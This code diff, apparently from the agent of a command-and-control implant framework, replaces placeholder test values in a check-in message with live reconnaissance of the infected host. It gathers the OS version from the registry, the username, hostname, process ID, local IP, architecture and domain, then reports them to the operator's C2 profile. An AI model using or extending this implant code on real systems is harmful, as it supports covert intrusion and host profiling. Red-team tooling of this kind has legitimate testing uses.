@@ -10,6 +10,10 @@ using AM = Apollo.Management;
 using Apollo.Api;
 using Apollo;
 using System.Reflection;
+using System.Net;
+using System.Net.Sockets;
+using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace Apollo.Agent
 {
@@ -77,21 +81,35 @@ namespace Apollo.Agent
             }
         }
 
+        private static string GetIP()
+        {
+            return Dns.GetHostEntry(
+                Dns.GetHostName()).AddressList.FirstOrDefault(
+                    ip => ip.AddressFamily == AddressFamily.InterNetwork
+                ).ToString();
+        }
+
+        private static string GetOSVersion()
+        {
+            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
+        }
+
         private bool Checkin()
         {
             CheckinMessage msg = new CheckinMessage()
             {
                 Action = "checkin",
-                OS = "Windows",
-                User = "tester",
-                Host = "test_host",
-                PID = 10,
-                IP = "127.0.0.1",
+                OS = $"{GetOSVersion()} {Environment.OSVersion.Version}",
+                User = Environment.UserName,
+                Host = Dns.GetHostName(),
+                PID = Process.GetCurrentProcess().Id,
+                IP = GetIP(),
                 UUID = UUID,
-                Architecture = "x64",
-                Domain = "TESTDOMAIN",
-                IntegrityLevel = IntegrityLevel.HighIntegrity,
-                ExternalIP = "99.99.99.99",
+                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
+                Domain = Environment.UserDomainName,
+                // Modify this later.
+                IntegrityLevel = IntegrityLevel.MediumIntegrity,
+                ExternalIP = "",
             };
             IC2Profile connectProfile = null;
             bool bRet = false;
